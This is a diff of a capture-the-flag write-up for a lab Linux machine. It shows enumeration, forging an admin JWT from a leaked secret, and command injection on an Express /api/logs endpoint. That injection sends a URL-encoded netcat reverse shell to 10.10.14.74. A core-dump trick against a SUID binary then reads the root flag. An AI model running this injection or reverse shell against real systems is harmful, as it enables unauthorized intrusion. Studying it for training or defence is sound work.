@@ -2,7 +2,7 @@
 
 ## Web Enumeration
 
-Nmap
+Starting with Nmap.
 ```shell
 # Nmap 7.92 scan initiated Fri Mar 25 13:06:23 2022 as: nmap -sV -sC -oA nmap-results 10.10.11.120
 Nmap scan report for 10.10.11.120 (10.10.11.120)
@@ -25,14 +25,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Mar 25 13:06:42 2022 -- 1 IP address (1 host up) scanned in 18.78 seconds
 ```
+Nothing interesting in particular, both 3000 and 80 ports are redirecting to the exactly same website.
 
-Gobuster results with medium wordlist
+Using Gobuster for directories with medium wordlist after the Nmap.
 ```shell
 /api                  (Status: 200) [Size: 93]
 /assets               (Status: 301) [Size: 179] [--> /assets/]
 /docs                 (Status: 200) [Size: 20720]
 /download             (Status: 301) [Size: 183] [--> /download/]
 ```
+Nothing of interest in here either, all of these unprotected directories are already visible from withing the site. So I have to dig a little deeper in the website.
 
 ## Website Enumeration
 
@@ -69,20 +71,23 @@ curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1
 ```
 and response is `{"role":{"role":"you are normal user","desc":"testuser"}}`. So I logged in as a user, but I need to find an other way to gain access as admin. I'm going to keep looking on the website for any other information, that could be helpful.
 
-I find out that, I can download the source code, which can be really useful.
+I can download the source code, which can be really useful.
 
 ## Source Code Examination
 
-Create JWT in log in
-`routes/auth.js`
+This is the source code of a javascript Express website. The `routes` directory has a couple of interesting javaScript files for the API's endpoints.
+
+In `routes/auth.js`, you can find the source code of the endpoints for registering and logging in. The most important stuff I found here, was the code for creating a JWT token in the log in function. It's using user's id, name and email and a secret that's located in an enviroment variable.
 ```js
     // create jwt 
     const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
     res.header('auth-token', token).send(token);
 ```
 
-`/priv`
-`rotes/private.js`
+
+In `routes/private.js`, there are two endpoints: the `/priv` and the `/log`. 
+
+After decrypting the JWT token, using the `TOKEN_SECRET`, the only authentication check is made is if the username is *"theadmin"*.
 ```js
 router.get('/priv', verifytoken, (req, res) => {
    // res.send(req.user)
@@ -110,6 +115,10 @@ router.get('/priv', verifytoken, (req, res) => {
     }
 })
 ```
+This means, that if I manage to find the TOKEN_SECRET, I can just forge a new one with username equal to *"theadmin"* and gain admin authentication.
+
+
+The second one isn't mentioned anywhere in the website, so it's a hidden endpoint, that's intended only for the admin and it gives him the ability to find the git log of a file.
 
 ```js
 router.get('/logs', verifytoken, (req, res) => {
@@ -147,12 +156,15 @@ router.use(function (req, res, next) {
     })
 });
 ```
+It executes code using user input without sanitizing it, which means that I can inject commands there. So the only thing I have to do now is find the `TOKEN_SECRET`.
+
+Checking in the `local-web` directory, there are two hidden files: a `.git` and a `.env`. In `.env`, there I find the `TOKEN_SECRET=secret` inside.
 
 ## JWT Forging
 
 Using jwt.io and the JWT token I got with "testuser", I will try to forge a new one with `name="theadmin"` and the `TOKEN_SECRET=secret`(email doesn't really matter, since it checks only if `name="theadmin"`).
 ![jwtsecret](img/jwtfake.png)
-Then I try to login with forged JWT token with `TOKEN_SECRET=secret`
+Then I will try to login with forged JWT token with `TOKEN_SECRET=secret`
 ```
 curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.DTKfqkj0GUAI46OLUGTwoOnBEgbQ0PkWk9pVMUz95g4' -i 'http://10.10.11.120/api/priv'
 ```
@@ -166,7 +178,7 @@ Go back to that commit with:
 Now I can forge the JWT token, this time with the real `TOKEN_SECRET`.
 ![jwtlegit](img/jwtlegit.png)
 
-and login with it
+and now login with it
 ```
 curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/priv'
 ```
@@ -174,37 +186,42 @@ curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1
 I am now authenticated as the admin! 
  `{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}`
 
-I have to find a way to make use of this, in order to get a reverse shell.
-
+I have to find a way to make use of this, in order to get a reverse shell. I will test if the `/logs` is vulnerable to command injection, adding a simple `whoami` command after the `;`.
 ```
 curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;whoami'
 ```
 
-and response `"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\ndasith\n"`
+and response is `"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\ndasith\n"`. The *"dasith"* in the end of the response is probably the username, so this is indeed vulnerable. Now, let's try to inject a URL encoded Netcat reverse shell payload.
 
 ```
 curl -X GET -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.74%204242%20%3E%2Ftmp%2Ff'
 ```
 
-I got the reverse shell and **User Flag** ✔️!!
+I got the reverse shell and the **User Flag** ✔️!!
 
 # Privillege Escalation
 
-`find / -type f -perm -u=s 2>/dev/null`
+User *"dasith"* doesn't seem to have any `sudo` rights. So I will search for any SUID binaries, that may be exploitable.
 
+`find / -type f -perm -u=s 2>/dev/null`
 
 Find `/opt/count` and visiting `/opt` there is a .c file also.
 ![code](img/code.png)
 
-This program, reads a path from user input, loads it in it's memory and counts how many rows it has if it's a file or how many
+This program, reads a path from user input, loads it in it's memory and uses dircount or filecount to get some stats and it lets user save the results in a file. The SUID bit is dropped before writing to the file(`setuid(getuid());`), so I can't really write anything in a file I don't have the permissions to do so.  The `prctl(PR_SET_DUMPABLE, 1);` produces a dump file if the program crashes in the `/var/crash` directory. That means, that if I crash the program while it executes, I can see in the dump file, the contents of the file I gave to it.
 
-Now I search the flag in the `strings CoreDump`.
+So I can run the `./count` and give it as input the `/root/root.txt` file and then after it executes the `prctl`, I can kill it from another terminal and read the root flag n the dump file.
 
-![shell1](img/shell1.png)
-
+First, run the executable with `/root/root.txt` as input:
 ![shell2](img/shell2.png)
 
+In an other terminal, I find the PID of the process and kill it:
+![shell1](img/shell1.png)
+
+I can unpack the crash file created
 ![unpack](img/unpack.png)
+
+Andn now I search for the flag in the `strings CoreDump`.
 
 ![coredump](img/coredump.png)
 
